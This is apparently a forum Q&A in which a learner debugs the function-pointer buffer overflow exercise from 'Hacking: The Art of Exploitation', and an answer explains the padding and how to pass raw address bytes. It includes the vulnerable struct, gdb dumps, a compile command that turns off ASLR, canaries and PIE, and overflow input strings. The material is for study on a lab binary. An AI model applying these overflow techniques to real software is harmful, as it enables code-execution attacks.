    "content": "I cannot get this buffer overflow exploit to work for the life of me. The source code is here. It is from the book, Hacking the Art of Exploitation. The subject here is the below struct:\n<pre><code>struct user {\n   int uid;\n   int credits;\n   int highscore;\n   char name[100];\n   int (*current_game) ();\n};\n</code></pre>\nThe idea is to overflow name[100] such that the address provided after the 100 letter A's will overwrite the address of the function pointer, entitled current_game.\nHowever, please see the below gdb readout:\n<pre><code>[Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��048e2c]\n56        printf(\"[You have %u credits] ->  \", player.credits);\n(gdb) x/40x player.name\n0x804c08c <player+12>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c09c <player+28>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0ac <player+44>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0bc <player+60>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0cc <player+76>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0dc <player+92>:    0x41414141  0x41414141  0x41414141  0x41414141\n0x804c0ec <player+108>:   0x41414141  0x080490bb  0x65383430  0x00006332\n0x804c0fc:  0x00000000  0x00000000  0x00000000  0x00000000\n0x804c10c:  0x00000000  0x00000000  0x00000000  0x00000000\n0x804c11c:  0x00000000  0x00000000  0x00000000  0x00000000\n(gdb) x/5x player.current_game\n0x80490bb <pick_a_number>:    0x83e58955  0xec8318ec  0x9d2e680c  0xa2e80804\n0x80490cb <pick_a_number+16>: 0x83fffff4\n(gdb) print 6*16\n$2 = 96\n</code></pre>\nI've placed the address of another function into player.name as noted by the <pre><code>[Name: A*100 ...</code></pre> line. Below this, you can see the memory layout, how there are indeed 100 A's in memory. However, after the final A, we see that the next memory spot is <pre><code>0x080490bb</code></pre> and has not been overwritten, even though we see that the player.name buffer does indeed contain an overflow just prior. I've shown a printout of player.current_game afterwards to display that it is indeed at address <pre><code>0x80490bb</code></pre> which is what we see in the dump directly after the last 0x41414141. I am baffled here.\nWhat I've Tried:\n\nDisabled ASLR on my Fedora 25 by setting <pre><code>/proc/sys/kernel/randomize_va_space</code></pre> to 0.\nEnabled executable stack in gcc.\nTurned off the stack protection in gcc.\nTurned off PIE\nYou can confirm with this command that I used to make the binary: <pre><code>gcc  -z execstack game_of_chance.c -fno-stack-protector -no-pie -m32 -o goc</code></pre>\nI've tried writing the address in as \\x2c\\x8e\\x04\\08 AND just straight 0x08048e2c, neither work. This is the address of the function I'm trying to run.\nObserved that paddr and vaddr are the same throughout multiple executions of the program.\nDebugged in both gdb as you see, as well as Radare2. You can see my rabin2 printout for the file below:\nhavecode true\npic      false\ncanary   false\nnx       false\ncrypto   false\nva       true\nintrp    /lib/ld-linux.so.2\nbintype  elf\nclass    ELF32\nlang     c\narch     x86\nbits     32\nmachine  Intel 80386\nos       linux\nminopsz  1\nmaxopsz  16\npcalign  0\nsubsys   linux\nendian   little\nstripped false\nstatic   false\nlinenum  true\nlsyms    true\nrelocs   true\nrpath    NONE\nbinsz    20471\n\nThanks.\nUpdate\nI am able to successfully cause a segmentation fault with the chars (such as 'A' or 'B'), however, when I do the A*100 followed by 08048e2c memory address which I am trying to jump execution to, the segfault happens, but the player.current_game function pointer address (which is right after the player.name buffer as shown above) is oddly <pre><code>[DEBUG] current_game pointer @ 0x34303830</code></pre> rather than the address 08048e2c, which causes the segmentation fault since it can't execute 0x34303830. Additionally, I placed read/write watches on 0x804c0ec to see if I could find anything writing but was not successful in finding anything else.\n",

Set up\nI used your command line to compile the program:\n<pre><code>gcc  -z execstack game_of_chance.c -fno-stack-protector -no-pie -m32 -o goc\n</code></pre>\nI've done one small change though, I changed\n<pre><code>#define DATAFILE \"/var/chance.data\" // File to store user data\n</code></pre>\nto\n<pre><code>#define DATAFILE \"chance.data\" // File to store user data\n</code></pre>\nfor some peace of mind.\n2. Play the game!\n\nAs you can see, I'm actually pretty bad at this. The only thing we need to remember is that we chose '1' at the game menu though.\n3. Exploit it!\nLets start by changing our name to overwrite the pointer:\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB\n\n\nSomething happened! Shoudln't that also work with just 4x BBBB at the end? Nope! But why? My best guess: stack alignment. Let's check this out.\n4. Toying around\nIn game_of_choice.c I've changed\n<pre><code>char name[100];\n</code></pre>\nto\n<pre><code>char name[128];\n</code></pre>\nAnd tried the same with 128 times 'A':\n\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\n\nIt works. So it seems your problem was stack alignment\nThe standard value of -mpreferred-stack-boundary seems to be 4, meaning gcc is trying to create 16-byte aligned stack boundaries.\n5. ASCII fun\nThe program is reading a string from the command line. What we want is to pass the address <pre><code>0x08048e2c</code></pre> in this string in a fashion is can be jumped too. The problem is that if we just write <pre><code>08048e2c</code></pre>, we are actually passing <pre><code>0x3038303438653263</code></pre> (<pre><code>0</code></pre> turns into <pre><code>0x30</code></pre>, <pre><code>8</code></pre> -> <pre><code>0x38</code></pre>, and so on each digit is a one byte number) as a value to the program. So we need to pass the actual bytes that make up the address.\nWhen we pass <pre><code>\\x2c\\x8e\\x04\\x08</code></pre> in the string, we actually pass <pre><code>0x5c7832635c7838655c7830345c3038</code></pre>, because it is still interpreted as a sequence of characters which are translated to byte values one by one.\nWhen we have a look at any ASCII table, we notice that <pre><code>\\x08</code></pre> translates to the special backspace-character. We certainly can not include it in text.\nUsing perl -e or echo -e, we let the corresponding program know it should look out for escape sequences when it receives a string. So they actually output the 'real' byte values.\n<pre><code>echo -e '\\x2c\\x8e\\x04\\08'\n</code></pre>\n",

Was also going to make sure nothing else was writing to the address after the overflow was run. When I overflow with function address, it seems to disappear.</span>",
